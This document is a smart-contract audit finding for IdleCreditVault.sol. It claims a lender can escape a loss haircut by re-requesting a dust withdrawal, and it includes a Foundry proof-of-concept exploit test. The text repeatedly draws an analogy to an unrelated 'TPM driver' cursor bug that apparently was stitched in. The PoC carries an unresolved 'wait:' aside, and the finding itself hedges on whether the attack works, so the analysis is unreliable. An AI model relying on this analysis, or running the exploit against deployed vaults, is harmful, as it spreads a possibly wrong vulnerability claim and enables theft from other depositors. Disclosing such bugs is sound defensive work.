### Title
Attacker escapes stopEpoch loss haircut by re-requesting a withdraw, moving `lastWithdrawRequest` past the loss epoch - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` keeps a single sequential cursor per user (`lastWithdrawRequest[_user]`) over per-epoch receipt storage (`withdrawsRequestsByEpoch`, `lossRecoveryPriceByEpoch`), exactly like the TPM driver keeping a sequential `f_pos` cursor over `data_buffer`. The TPM bug allowed an attacker-supplied positional offset to bypass the sequential cursor; here the attacker can move the cursor themselves by submitting a second `requestWithdraw`, after which the loss-adjusted claim path indexes `lossRecoveryPriceByEpoch` with the *new* epoch, finds nothing, and the haircutted receipt is paid at par through the funded-claim path.

### Finding Description
When a `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` stores the haircut in `lossRecoveryPriceByEpoch[epochNumber]` and zeroes `pendingWithdraws`, collecting only `pendingToFund < pendingBasis` underlying [1](#0-0) .

At claim time, `claimWithdrawRequest` first calls `_claimLossAdjustedWithdrawRequest`, which looks up the loss price using `lastWithdrawRequest[_user]` — the epoch of the user's *most recent* request — not the epoch where the haircut actually occurred [2](#0-1) . The clearing function `_clearWithdrawClaimForEpoch` only removes that epoch's slice from the aggregate `withdrawsRequests[_user]` if it is reached [3](#0-2) .

Attack sequence (fixed-APR mode, buffer → running → stopped-with-loss):
1. Attacker (KYC'd lender) calls `cdoEpoch.requestWithdraw(amount, tranche)` during epoch N. `requestWithdraw` records `withdrawsRequestsByEpoch[user][N]`, bumps `withdrawsRequests[user]`, and sets `lastWithdrawRequest[user] = N` [4](#0-3) .
2. Manager calls `stopEpochWithDuration(apr, 0, duration, lossAmount)` with a nonzero loss. `collectWithdrawFunds` stores `lossRecoveryPriceByEpoch[N']` (a partial price) and collects only the haircutted amount.
3. Attacker calls `requestWithdraw` again for a dust amount in epoch N+1 (or, if `epochNumber` was already incremented by `deposit()` at stop, immediately in the buffer of the next epoch). This sets `lastWithdrawRequest[user] = M > N`.
4. After one more epoch elapses, attacker calls `cdoEpoch.claimWithdrawRequest()`. `_claimLossAdjustedWithdrawRequest` computes `lossEpoch = lastWithdrawRequest[user] = M`, reads `lossRecoveryPriceByEpoch[M] == 0`, and returns early — the epoch-N haircutted receipt is never cleared via `_clearWithdrawClaimForEpoch` [5](#0-4) .
5. `_claimFundedWithdrawRequest` then passes its gate (`epochNumber > lastWithdrawRequest[user]`) and pays `withdrawsRequests[_user]` **in full at par**, including the epoch-N basis that was only funded at `lossRecoveryPrice < RECOVERY_FULL` [6](#0-5) .

The broken invariant is the loss waterfall / "one receipt, haircutted payout": a haircutted receipt is paid at par, and the strategy only holds the haircutted amount for it.

### Impact Explanation
The attacker withdraws `claimBasis` underlying while the strategy collected only `claimBasis * lossRecoveryPrice / RECOVERY_FULL`. The difference is taken from underlying held for other pending/funded receipts and post-default reserves, i.e., direct theft from other withdrawers and LPs, up to the full haircut magnitude (`claimBasis * (1 - lossRecoveryPrice/RECOVERY_FULL)`). If the haircut is large (e.g., 50% loss on pending receipts), roughly half the attacker's receipt value is stolen from other users' claims, potentially making later claims insolvent.

### Likelihood Explanation
Requires only an unprivileged KYC'd lender with a withdraw request pending during a loss epoch — a routine event (`stopEpochWithDuration` with `_lossAmount > 0` is an intended flow, as exercised in `test/foundry/IdleCDOEpochQueue.t.sol`). The second `requestWithdraw` for dust costs nothing beyond KYC. No privileged cooperation is needed; the honest manager/borrower sequence is unchanged. Caveat: the exploit requires that after the second request, `epochNumber` advances past `lastWithdrawRequest` while `lossRecoveryPriceByEpoch[lastWithdrawRequest]` stays zero — true whenever the second request's epoch differs from the epoch key used in `collectWithdrawFunds`; if `collectWithdrawFunds` keys the price under the post-increment `epochNumber`, even the single-request case pays out at par.

### Recommendation
Iterate all epochs with recorded receipts (`withdrawsRequestsByEpoch`) rather than trusting the single `lastWithdrawRequest` cursor, or store per-user the specific epoch(s) carrying loss-adjusted receipts and clear them before falling through to the funded path — analogous to how the TPM fix removes positional I/O rather than trusting an attacker-influenced offset. Concretely, in `_claimLossAdjustedWithdrawRequest`, do not derive `lossEpoch` from `lastWithdrawRequest[_user]`; track loss epochs per user (e.g., a mapping or the max epoch key with nonzero `lossRecoveryPriceByEpoch` among the user's request epochs) so a later request cannot hide an earlier haircutted receipt.

### Proof of Concept
Foundry fork test (mirroring helpers in `test/foundry/IdleCreditVault.t.sol` / `IdleCDOEpochQueue.t.sol`):

```solidity
function testLossHaircutEscapeViaSecondRequest() external {
    // buffer: deposit, start epoch, request withdraw of full tranche balance
    uint256 amount = 10000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    _transferBurnedTrancheTokens(address(this), true);
    _startEpochAndCheckPrices(0);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 trancheBal = IERC20(AAtranche).balanceOf(address(this));
    uint256 principal = cdoEpoch.requestWithdraw(trancheBal, address(AAtranche));

    // stopEpoch with 50% loss on pending basis
    _startEpochAndCheckPrices(1); // wait: loss is realized at stop; arrange borrower repayment
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 lossAmount = pendingBasis / 2; // 50% haircut on the receipt bucket
    (uint256 pendingToFund, ) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.prank(borrower);
    IERC20(defaultUnderlying).approve(address(cdoEpoch), type(uint256).max);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(10e18, 0, cdoEpoch.epochDuration(), lossAmount);

    uint256 lossEpoch = strategy.epochNumber();
    assertGt(strategy.lossRecoveryPriceByEpoch(lossEpoch), 0);
    assertLt(strategy.lossRecoveryPriceByEpoch(lossEpoch), strategy.RECOVERY_FULL());

    // attacker re-requests a dust withdraw in the next epoch -> moves lastWithdrawRequest
    _startEpochAndCheckPrices(2);
    cdoEpoch.requestWithdraw(1, address(AAtranche));

    // advance one epoch so the funded-claim gate passes
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, strategy.pendingWithdraws() + cdoEpoch.expectedEpochInterest());
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // claim: pays withdrawsRequests[user] at PAR, not the haircutted price
    uint256 balBefore = IERC20(defaultUnderlying).balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 got = IERC20(defaultUnderlying).balanceOf(address(this)) - balBefore;

    uint256 haircutted = principal * strategy.lossRecoveryPriceByEpoch(lossEpoch) / strategy.RECOVERY_FULL();
    assertGt(got, haircutted + 1); // stole the haircut from other receipt holders
}
```

Expected: `got ≈ principal` (full par payout) while the strategy collected only `pendingToFund < pendingBasis`, proving haircut escape at the expense of other claimants.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L281-294)
```text
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L326-349)
```text
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-426)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-800)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L815-820)
```text
    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
```
